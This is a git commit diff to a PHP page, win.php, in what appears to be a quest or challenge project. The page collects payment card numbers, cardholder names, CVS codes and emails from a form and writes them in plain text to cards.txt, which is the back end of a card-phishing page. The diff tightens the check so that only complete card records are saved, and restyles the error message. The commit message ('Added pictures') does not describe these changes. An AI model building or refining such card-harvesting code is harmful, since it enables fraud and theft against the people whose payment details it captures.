10ca96de45ce79f1e1be2b3efc2daca89a18c993
hi_melnikov <melnikovam10@gmail.com>
2018-02-14 22:18:22 +0300

    Added pictures

--- 01. Прыжок в мезозой/first-mini/win.php
+++ 01. Прыжок в мезозой/first-mini/win.php
@@ -17,13 +17,14 @@ else {
 <?php
 $ok = 1;
 if(isset($_POST["num"]) and isset($_POST["name"]) and isset($_POST["cvs"]) and isset($_POST["mail"])){
-  if($_POST["num"]=="" and $_POST["name"]=="" and $_POST["cvs"]=="" and $_POST["mail"]==""){
+  if($_POST["num"]=="" or $_POST["name"]=="" or $_POST["cvs"]=="" or $_POST["mail"]==""){
     $ok = 0;
   }
 }
 else{
   $ok = 0;
 }
+
 if ($ok == 1){
     $file = fopen("cards.txt", "a");
     fwrite($file, "!!! Email: " . $_POST["mail"]. " Card: " . $_POST["num"] . " Name: " . $_POST["name"] . " CVS: " . $_POST["cvs"] . "\n----------\n");
@@ -37,7 +38,7 @@ if ($ok == 1){
     echo "!!!</h4></div><br><form action = 'https://www.google.ru/'><input type = 'submit' value = 'Жду с нетерпением'/></form>";
 }
 else{
-  echo "<h4>Ошибка:</h4> не все данные";
-  echo "<br><form action = '/'><input type = 'submit' value = 'Назад'/></form>";
+  echo "<h1>Ошибка:</h1> <h3>не все данные</h3>";
+  echo "<br><form action = '/'><input type = 'submit' value = 'Назад' height = '1'/></form>";
 }
 ?>
